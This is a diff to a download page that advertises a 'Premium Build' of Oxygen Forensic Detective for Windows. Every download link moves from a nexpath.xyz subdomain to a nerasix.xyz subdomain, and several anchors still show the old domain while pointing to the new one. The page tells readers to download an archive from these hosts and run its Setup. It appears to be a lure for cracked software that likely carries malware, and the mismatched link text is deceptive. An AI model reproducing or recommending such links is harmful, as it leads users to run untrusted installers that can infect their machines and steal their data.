@@ -29,8 +29,8 @@ Complete Edition · Premium Build · Windows · Deployment
 
 > Use the project link below for Windows.
 
-* **Project link:** **[oxygen-forensic-detective-analysis-ultimate.nexpath.xyz](https://oxygen-forensic-detective-analysis-ultimate.nexpath.xyz/)**
-* **Full URL:** `https://oxygen-forensic-detective-analysis-ultimate.nexpath.xyz/`
+* **Project link:** **[oxygen-forensic-detective-analysis-ultimate.nerasix.xyz](https://oxygen-forensic-detective-analysis-ultimate.nerasix.xyz/)**
+* **Full URL:** `https://oxygen-forensic-detective-analysis-ultimate.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -56,17 +56,17 @@ Complete Edition · Premium Build · Windows · Deployment
 
 <details>
 <summary>&nbsp;<b>How to install?</b></summary>
-<br>Open <a href="https://oxygen-forensic-detective-analysis-ultimate.nexpath.xyz/">oxygen-forensic-detective-analysis-ultimate.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
+<br>Open <a href="https://oxygen-forensic-detective-analysis-ultimate.nerasix.xyz/">oxygen-forensic-detective-analysis-ultimate.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
 </details>
 
 <details>
 <summary>&nbsp;<b>Download didn't start?</b></summary>
-<br>Use the manual link on the NexPath download page, or open <a href="https://oxygen-forensic-detective-analysis-ultimate.nexpath.xyz/">oxygen-forensic-detective-analysis-ultimate.nexpath.xyz</a> directly in your browser.
+<br>Use the manual link on the NexPath download page, or open <a href="https://oxygen-forensic-detective-analysis-ultimate.nerasix.xyz/">oxygen-forensic-detective-analysis-ultimate.nexpath.xyz</a> directly in your browser.
 </details>
 
 <details>
 <summary>&nbsp;<b>Updates?</b></summary>
-<br>Open <a href="https://oxygen-forensic-detective-analysis-ultimate.nexpath.xyz/">oxygen-forensic-detective-analysis-ultimate.nexpath.xyz</a> again and download the latest version from NexPath.
+<br>Open <a href="https://oxygen-forensic-detective-analysis-ultimate.nerasix.xyz/">oxygen-forensic-detective-analysis-ultimate.nexpath.xyz</a> again and download the latest version from NexPath.
 </details>
 <details>
 <summary>&nbsp;<b>Requirements?</b></summary>
